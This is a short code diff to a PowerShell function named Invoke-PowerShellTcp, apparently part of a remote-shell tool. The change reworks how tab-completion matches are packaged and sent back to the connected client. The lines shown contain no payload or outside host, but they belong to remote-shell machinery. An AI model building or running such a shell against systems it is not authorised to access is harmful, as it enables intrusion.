@@ -161,20 +161,8 @@ function Invoke-PowerShellTcp
             $data = $packet.data
             $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
             $output = $x.CompletionMatches.CompletionText
-            if ($output) {
-                # make sure to only send a single string, never an array
-                if ($output.GetType() -eq [System.Object[]]) {
-                    if ( $packet.n -gt $output.length ) {
-                        $output = ""
-                    } else {
-                        $output = $output[$packet.n]
-                    }
-                } else {  # it's a string
-                    if ( $packet.n -ne 0 ) {
-                        $output = ""
-                    }
-                }
-            } else { $output = "" }
+            if (-not $output) { $output = "" }
+            if ($output.gettype() -eq [System.String]) { $output = @($output) }
 
             Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
         }
